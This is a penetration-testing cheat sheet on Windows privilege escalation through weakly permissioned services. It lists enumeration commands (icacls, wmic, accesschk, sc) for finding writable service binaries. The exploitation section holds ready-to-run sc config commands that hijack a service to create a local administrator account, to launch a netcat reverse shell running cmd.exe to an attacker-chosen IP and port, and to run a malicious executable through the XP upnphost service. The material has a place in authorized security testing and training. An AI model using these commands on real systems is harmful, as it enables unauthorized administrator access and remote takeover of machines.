# Vulnerable services

## Enumeration

### Icacls

```
icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"

icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users" 
```

### wmic

* Requires authorization to use wmic
* On windows XP replace icacls with cacls

```
FOR /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> .\permissions.txt
FOR /f eol^=^"^ delims^=^" %a in (.\permissions.txt) do cmd.exe /c icacls "%a"
```

#### Service name from exe

```
wmic service where "PathName like '%httpd%'" get Name,DisplayName
```

#### exe path from service name

```
wmic service where "Name like '%<name>%' or DisplayName like '%<name>%'" get PathName
```

### accesschk.exe

* Obtain from (newer versions lack the /accepteula option): [here ](https://xor.cat/assets/other/Accesschk.zip)or [here](https://web.archive.org/web/20071007120748if\_/http://download.sysinternals.com/Files/Accesschk.zip)

```
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\
```

### sc.exe

```
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```

## Exploitation

### PrivEsc

#### Add user

```
sc qc <service>
sc config <service> binpath= "net user <username> <password> /add" depend= "" obj= ".\LocalSystem" password= ""
sc stop <service>
sc start <service>
sc config <service> binpath= "net localgroup Administrators <username> /add" depend= "" obj= ".\LocalSystem" password= ""
sc stop <service>
sc start <service>
```

#### Send reverse shell

```
sc config <service> binpath= "<path to nc.exe> <ip> <port> -e C:\WINDOWS\System32\cmd.exe" depend= "" obj= ".\LocalSystem" password= ""
sc stop <service>
sc start <service>
```

### Windows XP - upnp service

```
sc config upnphost binpath= "<path to malicious executable>"
sc config upnphost depend= ""
sc config upnphost obj= ".\LocalSystem"
sc config upnphost password= ""
net start upnphost
```

